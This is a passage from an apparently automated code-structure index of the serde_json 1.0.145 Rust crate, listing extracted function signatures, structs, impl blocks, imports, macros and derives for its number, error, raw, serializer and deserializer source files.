          "fn $deserialize<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn next_key_seed<K>(&mut self, seed: K) -> Result<Option<K::Value>, Error>",
          "fn next_value_seed<V>(&mut self, seed: V) -> Result<V::Value, Error>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn from(value: ParserNumber) -> Self {",
          "fn from(u: $ty) -> Self {",
          "fn from(i: $ty) -> Self {"
        ],
        "struct_defs": [
          "struct NumberVisitor;",
          "struct NumberKey;",
          "struct FieldVisitor;",
          "struct Visitor;",
          "struct NumberFieldDeserializer;"
        ],
        "impl_blocks": [
          "impl PartialEq for N {",
          "impl Eq for N {}",
          "impl Hash for N {",
          "impl Number {",
          "impl Display for Number {",
          "impl Debug for Number {",
          "impl Serialize for Number {",
          "impl From<ParserNumber> for Number {",
          "impl From<$ty> for Number {",
          "impl From<$ty> for Number {",
          "impl Number {"
        ],
        "uses": [
          "use crate::de::ParserNumber;",
          "use crate::error::Error;",
          "use crate::error::ErrorCode;",
          "use alloc::borrow::ToOwned;",
          "use alloc::string::{String, ToString};",
          "use core::fmt::{self, Debug, Display};",
          "use core::hash::{Hash, Hasher};",
          "use serde::de::{self, Unexpected, Visitor};",
          "use serde::de::{IntoDeserializer, MapAccess};",
          "use serde::{forward_to_deserialize_any, Deserialize, Deserializer, Serialize, Serializer};",
          "use serde::ser::SerializeStruct;"
        ],
        "macros": [
          "/// assert!(Number::from_f64(256.0).is_some());",
          "/// assert!(Number::from_f64(f64::NAN).is_none());",
          "/// assert!(Number::from_i128(256).is_some());",
          "/// assert!(Number::from_u128(256).is_some());",
          "///     assert_eq!(number.as_str(), value);",
          "write!(formatter, \"Number({})\", self)",
          "let mut s = tri!(serializer.serialize_struct(TOKEN, 1));",
          "tri!(s.serialize_field(TOKEN, &self.n));",
          "let value = tri!(visitor.next_key::<NumberKey>());",
          "let v: NumberFromString = tri!(visitor.next_value());",
          "tri!(deserializer.deserialize_identifier(FieldVisitor));",
          "let n = tri!(s.parse().map_err(de::Error::custom));",
          "deserialize_any!(@expand [n]);",
          "deserialize_any!(@expand [n.clone()]);",
          "visitor.$visit(tri!(self.n.parse().map_err(|_| invalid_number())))",
          "deserialize_any!(owned);",
          "deserialize_number!(deserialize_i8 => visit_i8);",
          "deserialize_number!(deserialize_i16 => visit_i16);",
          "deserialize_number!(deserialize_i32 => visit_i32);",
          "deserialize_number!(deserialize_i64 => visit_i64);",
          "deserialize_number!(deserialize_i128 => visit_i128);",
          "deserialize_number!(deserialize_u8 => visit_u8);",
          "deserialize_number!(deserialize_u16 => visit_u16);",
          "deserialize_number!(deserialize_u32 => visit_u32);",
          "deserialize_number!(deserialize_u64 => visit_u64);",
          "deserialize_number!(deserialize_u128 => visit_u128);",
          "deserialize_number!(deserialize_f32 => visit_f32);",
          "deserialize_number!(deserialize_f64 => visit_f64);",
          "deserialize_any!(ref);",
          "deserialize_number!(deserialize_i8 => visit_i8);",
          "deserialize_number!(deserialize_i16 => visit_i16);",
          "deserialize_number!(deserialize_i32 => visit_i32);",
          "deserialize_number!(deserialize_i64 => visit_i64);",
          "deserialize_number!(deserialize_i128 => visit_i128);",
          "deserialize_number!(deserialize_u8 => visit_u8);",
          "deserialize_number!(deserialize_u16 => visit_u16);",
          "deserialize_number!(deserialize_u32 => visit_u32);",
          "deserialize_number!(deserialize_u64 => visit_u64);",
          "deserialize_number!(deserialize_u128 => visit_u128);",
          "deserialize_number!(deserialize_f32 => visit_f32);",
          "deserialize_number!(deserialize_f64 => visit_f64);",
          "impl_from_unsigned!(u8, u16, u32, u64, usize);",
          "impl_from_signed!(i8, i16, i32, i64, isize);",
          "impl_from_unsigned!(u128);",
          "impl_from_signed!(i128);"
        ],
        "derives": [
          "#[derive(Clone, PartialEq, Eq, Hash)]",
          "#[derive(Copy, Clone)]"
        ],
        "error_handling": 18
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/error.rs",
        "function_defs": [
          "fn from(j: Error) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn source(&self) -> Option<&(dyn error::Error + 'static)> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn custom<T: Display>(msg: T) -> Error {",
          "fn invalid_type(unexp: de::Unexpected, exp: &dyn de::Expected) -> Self {",
          "fn invalid_value(unexp: de::Unexpected, exp: &dyn de::Expected) -> Self {",
          "fn custom<T: Display>(msg: T) -> Error {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn make_error(mut msg: String) -> Error {",
          "fn parse_line_col(msg: &mut String) -> Option<(usize, usize)> {",
          "fn starts_with_digit(slice: &str) -> bool {"
        ],
        "struct_defs": [
          "struct ErrorImpl {",
          "struct JsonUnexpected<'a>(de::Unexpected<'a>);"
        ],
        "impl_blocks": [
          "impl Error {",
          "impl From<Error> for io::Error {",
          "impl Error {",
          "impl Display for ErrorCode {",
          "impl serde::de::StdError for Error {",
          "impl Display for Error {",
          "impl Display for ErrorImpl {",
          "impl Debug for Error {",
          "impl de::Error for Error {",
          "impl ser::Error for Error {"
        ],
        "uses": [
          "use crate::io;",
          "use alloc::boxed::Box;",
          "use alloc::string::{String, ToString};",
          "use core::fmt::{self, Debug, Display};",
          "use core::result;",
          "use core::str::FromStr;",
          "use serde::{de, ser};",
          "use std::error;",
          "use std::io::ErrorKind;"
        ],
        "macros": [
          "///                 eprintln!(\"error: {}\", error);",
          "Category::Io => unreachable!(),",
          "write!(",
          "write!(",
          "Error::custom(format_args!(",
          "Error::custom(format_args!(",
          "de::Unexpected::Float(value) => write!("
        ],
        "derives": [
          "#[derive(Copy, Clone, PartialEq, Eq, Debug)]"
        ],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//!     println!(\"Please call {} at the number {}\", v[\"name\"], v[\"phones\"][0]);",
          "//!     println!(\"Please call {} at the number {}\", p.name, p.phones[0]);",
          "//!     let john = json!({",
          "//!     println!(\"first phone number: {}\", john[\"phones\"][0]);",
          "//!     println!(\"{}\", john.to_string());",
          "//! let john = json!({",
          "//!         format!(\"+44 {}\", random_phone())",
          "//!     println!(\"{}\", j);"
        ],
        "derives": [],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/raw.rs",
        "function_defs": [
          "fn from_owned(json: Box<str>) -> Box<Self> {",
          "fn into_owned(raw_value: Box<Self>) -> Box<str> {",
          "fn clone(&self) -> Self {",
          "fn to_owned(&self) -> Self::Owned {",
          "fn default() -> Self {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(raw_value: Box<RawValue>) -> Self {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_map<V>(self, mut visitor: V) -> Result<Self::Value, V::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_map<V>(self, mut visitor: V) -> Result<Self::Value, V::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<RawKey, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_str<E>(self, s: &str) -> Result<(), E>",
          "fn deserialize<D>(self, deserializer: D) -> Result<Self::Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_borrowed_str<E>(self, s: &'de str) -> Result<Self::Value, E>",
          "fn deserialize<D>(self, deserializer: D) -> Result<Self::Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_str<E>(self, s: &str) -> Result<Self::Value, E>",
          "fn visit_string<E>(self, s: String) -> Result<Self::Value, E>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn next_key_seed<K>(&mut self, seed: K) -> Result<Option<K::Value>, Error>",
          "fn next_value_seed<V>(&mut self, seed: V) -> Result<V::Value, Error>",
          "fn next_key_seed<K>(&mut self, seed: K) -> Result<Option<K::Value>, Error>",
          "fn next_value_seed<V>(&mut self, seed: V) -> Result<V::Value, Error>",
          "fn into_deserializer(self) -> Self::Deserializer {",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_bool<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_i8<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_i16<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_i32<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_i64<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_i128<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_u8<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_u16<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_u32<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_u64<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_u128<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_f32<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_f64<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_char<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_str<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_string<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_bytes<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_byte_buf<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_option<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_unit<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_unit_struct<V>(self, name: &'static str, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_newtype_struct<V>(",
          "fn deserialize_seq<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_tuple<V>(self, len: usize, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_tuple_struct<V>(",
          "fn deserialize_map<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_struct<V>(",
          "fn deserialize_enum<V>(",
          "fn deserialize_identifier<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_ignored_any<V>(self, visitor: V) -> Result<V::Value, Error>"
        ],
        "struct_defs": [
          "struct ReferenceVisitor;",
          "struct BoxedVisitor;",
          "struct RawKey;",
          "struct FieldVisitor;",
          "struct RawKeyDeserializer;"
        ],
        "impl_blocks": [
          "impl RawValue {",
          "impl Clone for Box<RawValue> {",
          "impl ToOwned for RawValue {",
          "impl Default for Box<RawValue> {",
          "impl Debug for RawValue {",
          "impl Display for RawValue {",
          "impl RawValue {",
          "impl From<Box<RawValue>> for Box<str> {",
          "impl Serialize for RawValue {"
        ],
        "uses": [
          "use crate::error::Error;",
          "use alloc::borrow::ToOwned;",
          "use alloc::boxed::Box;",
          "use alloc::string::String;",
          "use core::fmt::{self, Debug, Display};",
          "use core::mem;",
          "use serde::de::value::BorrowedStrDeserializer;",
          "use serde::de::{",
          "use serde::forward_to_deserialize_any;",
          "use serde::ser::{Serialize, SerializeStruct, Serializer};"
        ],
        "macros": [
          "///     assert_eq!(out, r#\"{\"info\":[200,{}]}\"#);",
          ".field(&format_args!(\"{}\", &self.json))",
          "let borrowed = tri!(crate::from_str::<&Self>(&json));",
          "/// # assert_eq!(",
          "/// #     serde_json::json!({",
          "/// println!(\"{}\", serde_json::value::to_raw_value(&map).unwrap_err());",
          "let json_string = tri!(crate::to_string(value));",
          "let mut s = tri!(serializer.serialize_struct(TOKEN, 1));",
          "tri!(s.serialize_field(TOKEN, &self.json));",
          "write!(formatter, \"any valid JSON value\")",
          "let value = tri!(visitor.next_key::<RawKey>());",
          "write!(formatter, \"any valid JSON value\")",
          "let value = tri!(visitor.next_key::<RawKey>());",
          "tri!(deserializer.deserialize_identifier(FieldVisitor));"
        ],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/iter.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<io::Result<u8>> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::io;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/ser.rs",
        "function_defs": [
          "fn serialize_bool(self, value: bool) -> Result<()> {",
          "fn serialize_i8(self, value: i8) -> Result<()> {",
          "fn serialize_i16(self, value: i16) -> Result<()> {",
          "fn serialize_i32(self, value: i32) -> Result<()> {",
          "fn serialize_i64(self, value: i64) -> Result<()> {",
          "fn serialize_i128(self, value: i128) -> Result<()> {",
          "fn serialize_u8(self, value: u8) -> Result<()> {",
          "fn serialize_u16(self, value: u16) -> Result<()> {",
          "fn serialize_u32(self, value: u32) -> Result<()> {",
          "fn serialize_u64(self, value: u64) -> Result<()> {",
          "fn serialize_u128(self, value: u128) -> Result<()> {",
          "fn serialize_f32(self, value: f32) -> Result<()> {",
          "fn serialize_f64(self, value: f64) -> Result<()> {",
          "fn serialize_char(self, value: char) -> Result<()> {",
          "fn serialize_str(self, value: &str) -> Result<()> {",
          "fn serialize_bytes(self, value: &[u8]) -> Result<()> {",
          "fn serialize_unit(self) -> Result<()> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<()> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, value: &T) -> Result<()>",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_none(self) -> Result<()> {",
          "fn serialize_some<T>(self, value: &T) -> Result<()>",
          "fn serialize_seq(self, len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, name: &'static str, len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn collect_str<T>(self, value: &T) -> Result<()>",
          "fn write_str(&mut self, s: &str) -> fmt::Result {",
          "fn serialize_element<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<()> {",
          "fn serialize_element<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<()> {",
          "fn serialize_field<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<()> {",
          "fn serialize_field<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<()> {",
          "fn serialize_key<T>(&mut self, key: &T) -> Result<()>",
          "fn serialize_value<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<()> {",
          "fn serialize_field<T>(&mut self, key: &'static str, value: &T) -> Result<()>",
          "fn end(self) -> Result<()> {",
          "fn serialize_field<T>(&mut self, key: &'static str, value: &T) -> Result<()>",
          "fn end(self) -> Result<()> {",
          "fn invalid_number() -> Error {",
          "fn invalid_raw_value() -> Error {",
          "fn key_must_be_a_string() -> Error {",
          "fn float_key_must_be_finite() -> Error {",
          "fn serialize_str(self, value: &str) -> Result<()> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, value: &T) -> Result<()>",
          "fn serialize_bool(self, value: bool) -> Result<()> {",
          "fn serialize_i8(self, value: i8) -> Result<()> {",
          "fn serialize_i16(self, value: i16) -> Result<()> {",
          "fn serialize_i32(self, value: i32) -> Result<()> {",
          "fn serialize_i64(self, value: i64) -> Result<()> {",
          "fn serialize_i128(self, value: i128) -> Result<()> {",
          "fn serialize_u8(self, value: u8) -> Result<()> {",
          "fn serialize_u16(self, value: u16) -> Result<()> {",
          "fn serialize_u32(self, value: u32) -> Result<()> {",
          "fn serialize_u64(self, value: u64) -> Result<()> {",
          "fn serialize_u128(self, value: u128) -> Result<()> {",
          "fn serialize_f32(self, value: f32) -> Result<()> {",
          "fn serialize_f64(self, value: f64) -> Result<()> {",
          "fn serialize_char(self, value: char) -> Result<()> {",
          "fn serialize_bytes(self, _value: &[u8]) -> Result<()> {",
          "fn serialize_unit(self) -> Result<()> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<()> {",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_none(self) -> Result<()> {",
          "fn serialize_some<T>(self, value: &T) -> Result<()>",
          "fn serialize_seq(self, _len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, _len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, _name: &'static str, _len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn collect_str<T>(self, value: &T) -> Result<()>",
          "fn serialize_bool(self, _v: bool) -> Result<()> {",
          "fn serialize_i8(self, _v: i8) -> Result<()> {",
          "fn serialize_i16(self, _v: i16) -> Result<()> {",
          "fn serialize_i32(self, _v: i32) -> Result<()> {",
          "fn serialize_i64(self, _v: i64) -> Result<()> {",
          "fn serialize_i128(self, _v: i128) -> Result<()> {",
          "fn serialize_u8(self, _v: u8) -> Result<()> {",
          "fn serialize_u16(self, _v: u16) -> Result<()> {",
          "fn serialize_u32(self, _v: u32) -> Result<()> {",
          "fn serialize_u64(self, _v: u64) -> Result<()> {",
          "fn serialize_u128(self, _v: u128) -> Result<()> {",
          "fn serialize_f32(self, _v: f32) -> Result<()> {",
          "fn serialize_f64(self, _v: f64) -> Result<()> {",
          "fn serialize_char(self, _v: char) -> Result<()> {",
          "fn serialize_str(self, value: &str) -> Result<()> {",
          "fn serialize_bytes(self, _value: &[u8]) -> Result<()> {",
          "fn serialize_none(self) -> Result<()> {",
          "fn serialize_some<T>(self, _value: &T) -> Result<()>",
          "fn serialize_unit(self) -> Result<()> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<()> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, _value: &T) -> Result<()>",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_seq(self, _len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, _len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, _name: &'static str, _len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn serialize_bool(self, _v: bool) -> Result<()> {",
          "fn serialize_i8(self, _v: i8) -> Result<()> {",
          "fn serialize_i16(self, _v: i16) -> Result<()> {",
          "fn serialize_i32(self, _v: i32) -> Result<()> {",
          "fn serialize_i64(self, _v: i64) -> Result<()> {",
          "fn serialize_i128(self, _v: i128) -> Result<()> {",
          "fn serialize_u8(self, _v: u8) -> Result<()> {",
          "fn serialize_u16(self, _v: u16) -> Result<()> {",
          "fn serialize_u32(self, _v: u32) -> Result<()> {",
          "fn serialize_u64(self, _v: u64) -> Result<()> {",
          "fn serialize_u128(self, _v: u128) -> Result<()> {",
          "fn serialize_f32(self, _v: f32) -> Result<()> {",
          "fn serialize_f64(self, _v: f64) -> Result<()> {",
          "fn serialize_char(self, _v: char) -> Result<()> {",
          "fn serialize_str(self, value: &str) -> Result<()> {",
          "fn serialize_bytes(self, _value: &[u8]) -> Result<()> {",
          "fn serialize_none(self) -> Result<()> {",
          "fn serialize_some<T>(self, _value: &T) -> Result<()>",
          "fn serialize_unit(self) -> Result<()> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<()> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, _value: &T) -> Result<()>",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_seq(self, _len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, _len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, _name: &'static str, _len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn collect_str<T>(self, value: &T) -> Result<Self::Ok>",
          "fn write_null<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn write_bool<W>(&mut self, writer: &mut W, value: bool) -> io::Result<()>",
          "fn write_i8<W>(&mut self, writer: &mut W, value: i8) -> io::Result<()>",
          "fn write_i16<W>(&mut self, writer: &mut W, value: i16) -> io::Result<()>",
          "fn write_i32<W>(&mut self, writer: &mut W, value: i32) -> io::Result<()>",
          "fn write_i64<W>(&mut self, writer: &mut W, value: i64) -> io::Result<()>",
          "fn write_i128<W>(&mut self, writer: &mut W, value: i128) -> io::Result<()>",
          "fn write_u8<W>(&mut self, writer: &mut W, value: u8) -> io::Result<()>",
          "fn write_u16<W>(&mut self, writer: &mut W, value: u16) -> io::Result<()>",
          "fn write_u32<W>(&mut self, writer: &mut W, value: u32) -> io::Result<()>",
          "fn write_u64<W>(&mut self, writer: &mut W, value: u64) -> io::Result<()>",
          "fn write_u128<W>(&mut self, writer: &mut W, value: u128) -> io::Result<()>",
          "fn write_f32<W>(&mut self, writer: &mut W, value: f32) -> io::Result<()>",
          "fn write_f64<W>(&mut self, writer: &mut W, value: f64) -> io::Result<()>",
          "fn write_number_str<W>(&mut self, writer: &mut W, value: &str) -> io::Result<()>",
          "fn begin_string<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn end_string<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn write_string_fragment<W>(&mut self, writer: &mut W, fragment: &str) -> io::Result<()>",
          "fn write_char_escape<W>(&mut self, writer: &mut W, char_escape: CharEscape) -> io::Result<()>",
          "fn write_byte_array<W>(&mut self, writer: &mut W, value: &[u8]) -> io::Result<()>",
          "fn begin_array<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn end_array<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn begin_array_value<W>(&mut self, writer: &mut W, first: bool) -> io::Result<()>",
          "fn end_array_value<W>(&mut self, _writer: &mut W) -> io::Result<()>",
          "fn begin_object<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn end_object<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn begin_object_key<W>(&mut self, writer: &mut W, first: bool) -> io::Result<()>",
          "fn end_object_key<W>(&mut self, _writer: &mut W) -> io::Result<()>",
          "fn begin_object_value<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn end_object_value<W>(&mut self, _writer: &mut W) -> io::Result<()>",
          "fn write_raw_fragment<W>(&mut self, writer: &mut W, fragment: &str) -> io::Result<()>",
          "fn default() -> Self {",
          "fn begin_array<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn end_array<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn begin_array_value<W>(&mut self, writer: &mut W, first: bool) -> io::Result<()>",
          "fn end_array_value<W>(&mut self, _writer: &mut W) -> io::Result<()>",
          "fn begin_object<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn end_object<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn begin_object_key<W>(&mut self, writer: &mut W, first: bool) -> io::Result<()>",
          "fn begin_object_value<W>(&mut self, writer: &mut W) -> io::Result<()>",
          "fn end_object_value<W>(&mut self, _writer: &mut W) -> io::Result<()>",
          "fn format_escaped_str<W, F>(writer: &mut W, formatter: &mut F, value: &str) -> io::Result<()>",
          "fn format_escaped_str_contents<W, F>(",
          "fn indent<W>(wr: &mut W, n: usize, s: &[u8]) -> io::Result<()>"
        ],
        "struct_defs": [
          "struct Adapter<'ser, W: 'ser, F: 'ser> {",
          "struct MapKeySerializer<'a, W: 'a, F: 'a> {",
          "struct NumberStrEmitter<'a, W: 'a + io::Write, F: 'a + Formatter>(&'a mut Serializer<W, F>);",
          "struct RawValueStrEmitter<'a, W: 'a + io::Write, F: 'a + Formatter>(&'a mut Serializer<W, F>);"
        ],
        "impl_blocks": [
          "impl Formatter for CompactFormatter {}"
        ],
        "uses": [
          "use crate::error::{Error, ErrorCode, Result};",
          "use crate::io;",
          "use alloc::string::String;",
          "use alloc::string::ToString;",
          "use alloc::vec::Vec;",
          "use core::fmt::{self, Display};",
          "use core::hint;",
          "use core::num::FpCategory;",
          "use core::str;",
          "use serde::ser::{self, Impossible, Serialize};",
          "use self::fmt::Write;",
          "use self::CharEscape::*;"
        ],
        "macros": [
          "tri!(self",
          "tri!(self",
          "tri!(self.serialize_str(variant));",
          "tri!(self",
          "tri!(self",
          "tri!(value.serialize(&mut *self));",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self.serialize_str(variant));",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self.serialize_str(variant));",
          "tri!(self",
          "tri!(self",
          "debug_assert!(self.error.is_none());",
          "tri!(self",
          "match write!(adapter, \"{}\", value) {",
          "Ok(()) => debug_assert!(adapter.error.is_none()),",
          "tri!(ser",
          "tri!(value.serialize(&mut **ser));",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "_ => tri!(ser.formatter.end_array(&mut ser.writer).map_err(Error::io)),",
          "tri!(ser",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "tri!(ser",
          "tri!(key.serialize(MapKeySerializer { ser: *ser }));",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "tri!(ser",
          "tri!(value.serialize(&mut **ser));",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "_ => tri!(ser.formatter.end_object(&mut ser.writer).map_err(Error::io)),",
          "tri!(ser",
          "Compound::Number { .. } => unreachable!(),",
          "Compound::RawValue { .. } => unreachable!(),",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self",
          "tri!(self.begin_array(writer));",
          "tri!(self.begin_array_value(writer, first));",
          "tri!(self.write_u8(writer, *byte));",
          "tri!(self.end_array_value(writer));",
          "tri!(writer.write_all(b\"\\n\"));",
          "tri!(indent(writer, self.current_indent, self.indent));",
          "tri!(writer.write_all(if first { b\"\\n\" } else { b\",\\n\" }));",
          "tri!(writer.write_all(b\"\\n\"));",
          "tri!(indent(writer, self.current_indent, self.indent));",
          "tri!(writer.write_all(if first { b\"\\n\" } else { b\",\\n\" }));",
          "tri!(formatter.begin_string(writer));",
          "tri!(format_escaped_str_contents(writer, formatter, value));",
          "tri!(formatter.write_string_fragment(writer, string_run));",
          "tri!(formatter.write_char_escape(writer, char_escape));",
          "tri!(to_writer(&mut writer, value));",
          "tri!(to_writer_pretty(&mut writer, value));",
          "let vec = tri!(to_vec(value));",
          "let vec = tri!(to_vec_pretty(value));",
          "tri!(wr.write_all(s));"
        ],
        "derives": [
          "#[derive(Eq, PartialEq)]",
          "#[derive(Clone, Debug, Default)]",
          "#[derive(Clone, Debug)]"
        ],
        "error_handling": 97
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/de.rs",
        "function_defs": [
          "fn visit<'de, V>(self, visitor: V) -> Result<V::Value>",
          "fn invalid_type(self, exp: &dyn Expected) -> Error {",
          "fn peek_or_null(&mut self) -> Result<u8> {",
          "fn eat_char(&mut self) {",
          "fn next_char(&mut self) -> Result<Option<u8>> {",
          "fn next_char_or_null(&mut self) -> Result<u8> {",
          "fn error(&self, reason: ErrorCode) -> Error {",
          "fn peek_error(&self, reason: ErrorCode) -> Error {",
          "fn parse_whitespace(&mut self) -> Result<Option<u8>> {",
          "fn peek_invalid_type(&mut self, exp: &dyn Expected) -> Error {",
